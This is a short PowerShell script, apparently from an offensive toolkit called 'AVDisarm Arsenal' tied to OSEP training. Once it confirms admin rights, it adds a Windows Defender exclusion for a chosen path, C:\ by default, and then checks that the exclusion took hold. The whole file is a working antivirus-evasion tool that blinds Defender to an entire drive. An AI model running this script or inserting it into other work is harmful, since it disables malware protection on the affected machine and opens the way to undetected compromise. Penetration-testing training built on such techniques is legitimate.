<#
.SYNOPSIS
    OSEP Defender Exclusion Injector (PowerShell)
    Part of the AVDisarm Arsenal.
    Requires High Integrity (Local Admin).
#>

param (
    [string]$Path = "C:\"
)

Write-Host "[*] Target Path: $Path" -ForegroundColor Cyan

# 1. Check Integrity
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[-] Error: High Integrity (Admin) is required to add exclusions." -ForegroundColor Red
    return
}

# 2. Add Exclusion
Write-Host "[*] Attempting to add exclusion..." -ForegroundColor Gray
try {
    Add-MpPreference -ExclusionPath $Path -ErrorAction Stop
    Write-Host "[+] Successfully sent request to Defender." -ForegroundColor Green
} catch {
    Write-Host "[-] Failed to add exclusion: $($_.Exception.Message)" -ForegroundColor Red
    return
}

# 3. Verify
Write-Host "[*] Current Exclusion List:" -ForegroundColor Gray
$status = Get-MpPreference
if ($status.ExclusionPath -contains $Path) {
    Write-Host "[+] SUCCESS: '$Path' is in the exclusion list." -ForegroundColor Green
} else {
    Write-Host "[-] WARNING: '$Path' was not found in the list. Verification failed." -ForegroundColor Yellow
}

Write-Host "`nFull Exclusion List:" -ForegroundColor Gray
$status.ExclusionPath | ForEach-Object { Write-Host "  - $_" }
